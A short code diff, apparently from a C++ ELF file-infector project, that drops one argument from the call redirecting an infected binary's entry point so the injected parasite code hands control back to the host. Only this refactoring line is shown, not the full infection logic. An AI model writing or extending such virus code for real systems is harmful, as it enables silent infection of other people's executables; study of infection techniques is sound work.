@@ -255,7 +255,7 @@ bool ReverseTextInfector::inject(std::span<std::byte> host_mapping,
                    original_code_segment_file_offset_);
   // Patch parasite to resume host code after execution.
   return common::redirect_elf_entry_point(
-      ehdr.e_type, original_e_entry_, ehdr.e_entry, virus_real_start_offset,
+      original_e_entry_, ehdr.e_entry, virus_real_start_offset,
       parasite_mapping.size(), host_mapping);
 }
 
